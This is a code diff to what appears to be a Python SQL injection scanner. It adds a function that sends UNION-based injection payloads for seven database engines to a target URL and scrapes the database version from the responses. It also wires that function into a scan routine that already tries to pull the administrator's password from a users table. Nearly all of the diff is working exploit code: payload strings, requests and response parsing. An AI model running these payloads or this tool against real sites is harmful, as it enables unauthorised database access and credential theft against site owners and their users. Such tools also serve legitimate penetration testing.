@@ -97,6 +97,129 @@ def find_urls_to_test(url, base_url):
 
     return links
 
+def exploit_database_version(url):
+    """
+    Attempts to detect the database type and version through SQL injection payloads.
+
+    Args:
+        url (str): The target URL where the SQL injection payloads will be tested.
+
+    Returns:
+        None: Prints the detected database type and version if found, or appropriate error messages.
+
+    Description:
+        - Defines a set of SQL injection payloads for various database types, including Oracle, MySQL, PostgreSQL, 
+          Microsoft SQL Server, SQLite, DB2, and Sybase.
+        - Iterates through each database type and its associated payloads.
+        - Sends a request with the SQL payload appended to the target URL.
+        - Analyzes the server's response to detect specific database-related keywords or error messages.
+        - If a potential database version is found, it parses the response and prints the database type and version.
+        - Handles HTTP status codes, specifically 403 (Forbidden) and 500 (Internal Server Error), and continues
+          testing payloads if no success is achieved with the initial payload.
+        - In case of an HTTP error or if no matching database type is detected after all payloads are exhausted, 
+          an appropriate message is printed.
+        - Includes exception handling for request-related errors to ensure the function doesn't crash on failure.
+    """
+    database_types = {
+        'Oracle': [
+            "' AND 1=2 UNION SELECT NULL, banner FROM v$version--",
+            "' AND 1=2 UNION SELECT NULL, version FROM v$instance--"
+        ],
+        'MySQL': [
+            " UNION SELECT @@version, NULL%23",
+            "' AND 1=2 UNION SELECT version(), NULL--"
+        ],
+        'PostgreSQL': [
+            "' UNION SELECT version(), NULL--",
+            "' AND 1=2 UNION SELECT version(), current_user--"
+        ],
+        'Microsoft SQL Server': [
+            "' UNION SELECT @@version, NULL--",
+            "' AND 1=2 UNION SELECT version(), NULL--"
+        ],
+        'SQLite': [
+            "' UNION SELECT sqlite_version(), NULL--",
+            "' AND 1=2 UNION SELECT sqlite_version(), NULL--"
+        ],
+        'DB2': [
+            "' AND 1=2 UNION SELECT NULL, service_level FROM sysibm.sysversions--",
+            "' AND 1=2 UNION SELECT version(), NULL FROM sysibm.sysversions--"
+        ],
+        'Sybase': [
+            "' UNION SELECT @@version, NULL--",
+            "' AND 1=2 UNION SELECT version(), current_user--"
+        ]
+    }
+
+    try:
+        for db_type, payloads in database_types.items():
+            #print(f"[*] Attempting to detect {db_type} database...")
+            
+            for payload in payloads:
+                try:
+                    response = requests.get(f"{url}{payload}")
+                    response.raise_for_status()
+                except requests.exceptions.HTTPError as e:
+                    status_code = e.response.status_code
+
+                    if status_code == 403:
+                        print(f"[+] Congratulations, your website is secure: access to this URL was blocked with a 403 (Forbidden) code.")
+                        continue
+                    elif status_code == 500:
+                        print(Fore.GREEN + f"[+] Potential vulnerability found with payload: {payload}")
+                        continue
+                    else:
+                        #print(f"[-] An error occurred: Received HTTP {status_code} for this URL.")
+                        continue
+
+                if re.search(db_type, response.text, re.IGNORECASE):
+                    soup = BeautifulSoup(response.text, 'html.parser')
+
+                    if db_type == 'Oracle':
+                        version_oracle = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
+                        if version_oracle:
+                            print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_oracle.strip()}")
+                            return f"{db_type} version: {version_oracle.strip()}"
+                            
+                    elif db_type in ['MySQL', 'Microsoft SQL Server', 'Sybase']:
+                        version_generic = soup.find(string=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
+                        if version_generic:
+                            version_number = re.search(r'\d{1,2}\.\d{1,2}\.\d{1,2}[-\w\.]*', version_generic)
+                            if version_number:
+                                print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_number.group(0)}")
+                                return f"{db_type} version: {version_number.group(0)}"
+                            
+                    elif db_type == 'PostgreSQL':
+                        version_postgres = soup.find(string=re.compile('PostgreSQL\s[\d\.]+'))
+                        if version_postgres:
+                            print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_postgres.strip()}")
+                            return f"{db_type} version: {version_postgres.strip()}"
+
+                    elif db_type == 'SQLite':
+                        version_sqlite = soup.find(string=re.compile('SQLite\s[\d\.]+'))
+                        if version_sqlite:
+                            print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_sqlite.strip()}")
+                            return f"{db_type} version: {version_sqlite.strip()}"
+                        
+                    elif db_type == 'DB2':
+                        version_db2 = soup.find(string=re.compile('DB2\s[\d\.]+'))
+                        if version_db2:
+                            print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_db2.strip()}")
+                            return f"{db_type} version: {version_db2.strip()}"
+
+                    print(Fore.GREEN + f"[+] Found the database: {db_type} | [-] Could not extract the version.")
+            
+                else:
+                    #print(f"[-] No match found for {db_type} using current payload.")
+                    return None
+
+        print("[-] Could not detect the database type after exhausting all payloads.")
+    
+    except requests.exceptions.RequestException as e:
+        print(f"[-] An error occurred while trying to detect the database version: {e}")
+        return None
+        
+        
 def exploit_sqli_users_table(url):
     """
     Performs SQL injection to attempt to retrieve the administrator's password from the users table.
@@ -290,6 +413,7 @@ def handle_scan():
             sqli_result = exploit_sqli(test_url)
             num_col = exploit_sqli_column_number(test_url)
             admin_found, admin_password = exploit_sqli_users_table(test_url)
+            db_version = exploit_database_version(test_url)
             
             if sqli_result:
                 results.append({
@@ -312,6 +436,14 @@ def handle_scan():
                     "admin_password": admin_password
                 })
                 
+            if db_version:
+                print(Fore.GREEN + f"[+] Database version found: {db_version} for {test_url}")
+                results.append({
+                    "url": test_url,
+                    "database_version_found": True,
+                    "database_version": db_version
+                })
+                
             else:
                 print("[-] URL not vulnerable to SQL injection")
             
@@ -320,9 +452,11 @@ def handle_scan():
             "sql_vulnerabilities_found": any('payloads' in result for result in results),
             "columns_detected_found": any('columns_detected' in result for result in results),
             "admin_password_found": any('admin_password_found' in result for result in results),
+            "database_version_found": any('database_version_found' in result for result in results),
             "sql_injection_results": [r for r in results if 'payloads' in r],
             "column_detection_results": [r for r in results if 'columns_detected' in r],
-            "admin_password_results": [r for r in results if 'admin_password_found' in r]
+            "admin_password_results": [r for r in results if 'admin_password_found' in r],
+            "database_version_results": [r for r in results if 'database_version_found' in r]
         })
         
     else:
